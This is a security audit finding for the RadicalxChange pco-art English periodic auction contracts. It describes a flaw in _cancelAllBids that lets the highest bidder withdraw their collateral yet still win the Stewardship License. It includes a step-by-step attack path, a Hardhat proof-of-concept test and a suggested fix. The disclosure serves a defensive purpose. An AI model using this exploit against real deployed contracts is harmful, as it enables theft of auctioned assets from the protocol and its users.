# A vulnerability in the `_cancelAllBids` function allows the highest bidder to obtain the `Stewardship License` for free

## Summary
The [`cancelAllBidsAndWithdrawCollateral`](https://github.com/RadicalxChange/pco-art/blob/4acd6b06840028ba616b6200439ce0d6aa1e6276/contracts/auction/facets/EnglishPeriodicAuctionFacet.sol#L187C14-L187C48) function in `EnglishPeriodicAuctionFacet.sol` enables users to cancel their bids and withdraw their outstanding collateral balance. However, this function can be exploited by a malicious user to steal the _Stewardship License_, while only incurring minimal expenses in the form of gas fees.

## Vulnerability Detail
Context : In order to place a bid, a bidder must outbid the previous highest bid. Therefore, when a bidder places a bid in an auction round using the [`placeBid`](https://github.com/RadicalxChange/pco-art/blob/4acd6b06840028ba616b6200439ce0d6aa1e6276/contracts/auction/facets/EnglishPeriodicAuctionFacet.sol#L153) function, both `bids[tokenId][round][bidder].collateralAmount` **and** `highestBids[tokenId][round].collateralAmount` are updated to reflect the collateral of the bidder. Similarly, at the end of each auction round, both variables are updated to zero for the highest bidder, as they receive the _Stewardship License_ in exchange for their collateral.

The `cancelAllBidsAndWithdrawCollateral` function invokes the [`_cancelAllBids`](https://github.com/RadicalxChange/pco-art/blob/4acd6b06840028ba616b6200439ce0d6aa1e6276/contracts/auction/EnglishPeriodicAuctionInternal.sol#L416) internal function, which iterates through all auction rounds for the specified `tokenId` and accumulates the outstanding collateral balance for the `bidder`. This accumulated balance from all rounds is then returned to the bidder in the [`_withdrawCollateral`](https://github.com/RadicalxChange/pco-art/blob/4acd6b06840028ba616b6200439ce0d6aa1e6276/contracts/auction/EnglishPeriodicAuctionInternal.sol#L439) function. However, this function solely updates `bids[tokenId][round][bidder]`, allowing the highest bidder of an ongoing auction round to withdraw their collateral while still retaining their position as the highest bidder in the ongoing auction round. Consequently, if no higher bid is placed by the end of the auction round (i.e., `highestBids[tokenId][currentAuctionRound]` is not updated), the _Stewardship License_ is transferred to this bidder, allowing them to effectively obtain it for free since they withdrew their collateral.

A valid attack path would be:
1. An auction commences for _Stewardship License_ `tokenId` and bids are placed.
2. The attacker outbids the highest bid just before the auction ends and calls `cancelAllBidsAndWithdrawCollateral` in the same transaction, thereby receiving their collateral back.
3. When [`closeAuction`](https://github.com/RadicalxChange/pco-art/blob/4acd6b06840028ba616b6200439ce0d6aa1e6276/contracts/auction/facets/EnglishPeriodicAuctionFacet.sol#L225) is called, the attacker receives the _Stewardship License_.

Proof of Code : 
A simulation of the above-mentioned scenario can be carried out by copying the following test into `EnglishPeriodicAuction.ts` and running `yarn run hardhat test --grep 'POC'` : 

```typescript
describe('exploit', function () {
    it('POC', async function () {
      // Auction start: Now + 100
      // Auction end: Now + 400
      const instance = await getInstance({
        auctionLengthSeconds: 300,
        initialPeriodStartTime: (await time.latest()) + 100,
        licensePeriod: 1000,
      });
      const licenseMock = await ethers.getContractAt(
        'NativeStewardLicenseMock',
        instance.address,
      );

      // storing the initial balance of the attacker (bidder1)
      const oldBidder1Balance = await ethers.provider.getBalance(
        bidder1.address,
      );

      // Mint license to bidder2
      const steward = bidder2.address;
      await licenseMock.mintToken(steward, 0);

      // Start auction
      await time.increase(300);
        
      // Placing an initial bid
      const bidAmount = ethers.utils.parseEther('1.0');
      const feeAmount = await instance.calculateFeeFromBid(bidAmount);
      const collateralAmount = feeAmount.add(bidAmount);

      await instance
        .connect(owner)
        .placeBid(0, bidAmount, { value: collateralAmount });

      const bidAmount1 = ethers.utils.parseEther('1.5');
      const feeAmount1 = await instance.calculateFeeFromBid(bidAmount1);
      const collateralAmount1 = feeAmount1.add(bidAmount1);

     // the attacker outbids the highest bid, cancels their bid and withdraws their collateral just before the auction ends
      await time.increase(50);

      await instance
        .connect(bidder1)
        .placeBid(0, bidAmount1, { value: collateralAmount1 });

      await instance.connect(bidder1).cancelAllBidsAndWithdrawCollateral(0);

      await time.increase(50);

      // the auction closes
      await instance.connect(owner).closeAuction(0);

      // storing the final balance of the attacker (bidder1)
      const newBidder1Balance = await ethers.provider.getBalance(
        bidder1.address,
      );

      // the owner of the stewardship license is now the attacker (bidder1)
      expect(await licenseMock.ownerOf(0)).to.be.equal(bidder1.address);

      // however the attacker still retains the collateral they placed in the auction, the only loss is the gas fees (which is miniscule)
      expect(oldBidder1Balance.sub(newBidder1Balance)).to.be.lt(
        collateralAmount1,
      );

      // the attacker has practically stolen the stewardship license

    });
  });
```
## Impact
The _Stewardship License_ can be obtained for free, rendering the protocol ineffective.

## Recommendation
Update `_cancelAllBids` to : 

```solidity
function _cancelAllBids(uint256 tokenId, address bidder) internal { 
        EnglishPeriodicAuctionStorage.Layout
            storage l = EnglishPeriodicAuctionStorage.layout();

        uint256 currentAuctionRound = l.currentAuctionRound[tokenId];

        require(
            bidder != l.highestBids[tokenId][currentAuctionRound].bidder,
            'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'
        );

        for (uint256 i = 0; i <= currentAuctionRound; i++) {
            Bid storage bid = l.bids[tokenId][i][bidder];

            if (bid.collateralAmount > 0) {
                // Make collateral available to withdraw
                l.availableCollateral[bidder] += bid.collateralAmount;

                // Reset collateral and bid
                bid.collateralAmount = 0;
                bid.bidAmount = 0;
            }
        }
    }
```
